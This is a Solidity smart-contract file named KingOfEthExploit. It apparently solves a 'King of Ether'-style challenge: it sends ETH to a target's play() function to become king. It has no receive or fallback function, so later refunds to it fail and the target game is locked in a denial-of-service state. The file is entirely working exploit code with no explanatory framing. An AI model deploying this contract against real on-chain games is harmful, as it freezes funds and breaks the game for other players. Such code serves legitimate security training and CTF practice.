// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IKingOfEth {
    function play() external payable;
}

contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(IKingOfEth _target) {
        target = _target;
    }

    function pwn() external payable {
        target.play{value: msg.value}();
    }
}